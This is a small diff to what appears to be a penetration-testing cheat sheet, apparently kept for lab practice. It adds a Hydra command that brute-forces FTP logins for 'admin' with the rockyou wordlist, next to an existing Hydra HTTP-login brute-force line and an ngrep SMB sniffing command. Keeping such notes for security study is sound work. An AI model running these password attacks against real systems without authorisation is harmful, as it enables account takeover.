@@ -51,6 +51,7 @@ sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139
 ##### Hydra easy
 ```bash
 hydra -l bethany -P /usr/share/wordlists/rockyou.txt -s 9505 -f 10.11.1.50 http-get /~login -V -I
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ftp -vV -f -e nsr -I
 ```
 ##### WP easy
 ```bash
